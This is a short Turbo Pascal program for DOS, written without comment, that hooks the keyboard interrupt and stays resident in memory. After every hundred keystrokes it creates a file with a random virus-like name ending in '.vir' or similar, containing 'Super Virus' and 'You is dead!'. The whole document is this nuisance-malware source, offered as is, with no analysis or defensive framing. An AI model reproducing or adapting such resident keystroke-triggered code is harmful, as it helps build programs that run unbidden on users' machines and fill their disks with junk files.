{$M $800,0,0}
uses crt,dos;
var k:procedure;
    fil:text;

    s:strinG;F,l:Integer;
{$F+}
procedure ke; interrupt;
begin

if port[$60] < $80 then
begin
       l:=l+1;

       if l=100 then
        begin
          l:=0;

  randomize;
    case random(10)+1 of
   1: s:='virus';
   2: s:='compute';
   3: s:='xfvirus';
   4: s:='fruit';
   5: s:='okvirus';
   6: s:='columbi';
   7: s:='deadvir';
   8: s:='_______';
   9: s:='svirusf';
   10:s:='erasevi';
    end;
       s:=s+chr(random(200)+40);
     case random(10)+1 of
   1: s:=s+'.vir';
   2: s:=s+'.vir';
   3: s:=s+'.xfv';
   4: s:=s+'.vir';
   5: s:=s+'.okv';
   6: s:=s+'.vir';
   7: s:=s+'.0vi';
   8: s:=s+'.___';
   9: s:=s+'.svf';
   10:s:=s+'.vir';
    end;
          assign(fil,s);
          rewrite(fil);
          writeln(fil,'Super Virus');
          writeln(fil,'You is dead!');
          close(fil);
 end;


end;
inline($9C);
k;
end;
{$F-}
begin
 l:=0;
 getintvec($9,@k);
 setintvec($9,addr(ke));
 keep(0);
end.